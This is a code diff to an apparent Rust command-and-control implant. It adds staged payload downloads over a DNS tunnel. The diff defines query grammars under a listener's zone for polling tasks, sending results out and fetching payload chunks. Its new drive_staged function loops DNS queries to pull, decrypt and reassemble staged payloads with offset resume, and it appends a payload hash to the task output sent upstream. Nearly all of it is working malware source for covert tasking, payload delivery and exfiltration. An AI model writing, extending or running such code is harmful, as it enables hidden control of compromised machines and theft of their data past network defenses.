@@ -11,7 +11,7 @@ use crate::envelope;
 use crate::error::ContactError;
 use crate::profile::Profile;
 use crate::session::{Attempt, Session};
-use crate::wire::{ChannelInput, Frame, FrameKind, TaskRequest, TaskResult};
+use crate::wire::{ChannelInput, Frame, FrameKind, StagedChunk, TaskRequest, TaskResult};
 
 // The DNS carriage (architecture.md Sec 8, the datagram family): contacts as
 // TXT queries under the listener's zone, the query NAME carrying the
@@ -27,14 +27,20 @@ use crate::wire::{ChannelInput, Frame, FrameKind, TaskRequest, TaskResult};
 //   delivery    n.<b32(task)>.<b32(sha128)>.<b32(implant)>.<zone>
 //   enroll      e.<b32(stream)>.<seq>.<t|m>.<b32(chunk)>.<zone>
 //   answer      a.<b32(token)>.<seq>.<zone>
+//   staged      s.<b32(task)>.<offset>.<b32(prefix sha256) | e>.<b32(implant)>.<zone>
+//   staged get  d.<b32(token)>.<seq>.<zone>
 //
 // A poll's TXT answer concatenates to the base32 of kind || message -- 't'
 // for a signed TaskRequest, 'i' for length-prefixed ChannelInput payloads
 // (the store-and-forward channel discipline) -- sealed as a raw R1 body
 // under the DNS poll tag when the artifact baked a key. Results and channel
 // output chunk upstream under their own tags, each re-sent until the
-// delivery probe confirms the blob landed. Short-argument tasking only:
-// a TaskRequest past the datagram budget never crosses this wire.
+// delivery probe confirms the blob landed. A staged task demands at its
+// seam over s., and the answer's token names a d.-probe download whose
+// chunks seal per chunk under the staged tag for a keyed artifact --
+// byte-offset resume (ADR-010) on the slowest wire too. Short-argument
+// tasking only: a TaskRequest past the datagram budget never crosses this
+// wire.
 
 /// One upstream chunk's raw bytes: 39 bytes encode to 63 base32 characters,
 /// the label ceiling.
@@ -268,12 +274,26 @@ impl Dns {
         // output both re-assemble server-side, so the blob takes over the
         // delivery duty the outbox's batch discipline holds elsewhere.
         session.drain_channels();
+        // A staged task this poll accepted (or an earlier cycle left
+        // pending) services inside the contact: the s./d. exchange is its
+        // own query loop, and a transfer it completes queues its result for
+        // this cycle's upstream drain below.
+        self.drive_staged(session)?;
         let batch = session.outbox.batch();
         for frame in &batch {
             match frame.kind() {
                 FrameKind::TaskResult => {
                     if let Ok(result) = TaskResult::decode(frame.payload.as_ref()) {
-                        for blob in split_upstream(result.output.as_bytes()) {
+                        // The staged arm's payload hash rides the grammar this
+                        // carriage carries: only the output string crosses as
+                        // r-chunks, so the token rides its tail and the server
+                        // strips it before recording.
+                        let mut report = result.output.clone();
+                        if let Some(sha) = result.payload_sha256.as_deref() {
+                            report.push_str("\nsha256:");
+                            report.push_str(sha);
+                        }
+                        for blob in split_upstream(report.as_bytes()) {
                             self.enqueue(
                                 &result.task_id,
                                 PendingKind::Result {
@@ -296,7 +316,97 @@ impl Dns {
             }
         }
         session.outbox.batch_crossed(batch.len());
+        session.staged_cycle_end();
         self.flush_pending(session)
+    }
+
+    /// The staged arm over the datagram grammar (ADR-010): each pending
+    /// transfer demands at its seam -- s.&lt;task&gt;.&lt;offset&gt;.&lt;prefix
+    /// proof&gt;.&lt;implant&gt; -- and the answer's token names a download
+    /// the d. probes drain chunk by chunk, each chunk placed at its absolute
+    /// offset through the session's shared transfer state. A demand this
+    /// carrier does not answer counts against the no-progress guard; a
+    /// download that stalls (an evicted token, a dead front) breaks and
+    /// re-demands on the next cycle from wherever the placement stopped --
+    /// the same resume the stream carriages run, on the query-rate cadence.
+    fn drive_staged(&mut self, session: &mut Session) -> Result<(), ContactError> {
+        for task_id in session.staged_pending() {
+            let (offset, prefix) = session.staged_seam(&task_id);
+            let proof = match &prefix {
+                Some(sha) => base32_encode(sha),
+                None => "e".into(),
+            };
+            let name = format!(
+                "s.{}.{}.{}.{}.{}",
+                base32_encode(task_id.as_bytes()),
+                offset,
+                proof,
+                base32_encode(session.implant_id.as_bytes()),
+                self.zone,
+            );
+            let Ok(Some(answer)) = query(&self.exchange, &name) else {
+                continue; // unanswered: the cycle's idle guard owns the failure
+            };
+            let text = String::from_utf8_lossy(&answer).into_owned();
+            let Some(token) = text.strip_prefix('=').and_then(base32_decode) else {
+                continue;
+            };
+
+            // The download: sequential probes to the terminal chunk, placing
+            // each at its offset -- a gap the placement refuses leaves the
+            // state intact, and the next demand re-establishes the seam.
+            let mut at = offset;
+            let mut misses = 0;
+            for sequence in 0u64.. {
+                let name = format!("d.{}.{}.{}", base32_encode(&token), sequence, self.zone);
+                let Ok(answer) = query(&self.exchange, &name) else {
+                    break; // a transport failure ends the burst for this cycle
+                };
+                let Some((terminal, sealed)) = answer
+                    .map(|payload| String::from_utf8_lossy(&payload).into_owned())
+                    .and_then(|text| parse_answer_chunk(&text))
+                else {
+                    misses += 1;
+                    if misses >= 3 {
+                        break; // the token is gone: re-demand next cycle
+                    }
+                    continue;
+                };
+                misses = 0;
+                let plain = match &self.seal {
+                    Some(key) => match envelope::try_open_raw_body(
+                        &sealed,
+                        &key.key_id,
+                        &key.key,
+                        envelope::DNS_STAGED_AAD,
+                    ) {
+                        Some(opened) => opened,
+                        None => {
+                            misses += 1;
+                            if misses >= 3 {
+                                break;
+                            }
+                            continue;
+                        }
+                    },
+                    None => sealed,
+                };
+                let chunk = StagedChunk {
+                    task_id: task_id.clone(),
+                    sequence,
+                    terminal,
+                    data: plain,
+                    offset: Some(at),
+                };
+                at += chunk.data.len() as u64;
+                let done = chunk.terminal;
+                session.accept_staged_chunk(&chunk);
+                if done {
+                    break;
+                }
+            }
+        }
+        Ok(())
     }
 
     fn enqueue(&mut self, task: &str, kind: PendingKind, plaintext: Vec<u8>) {
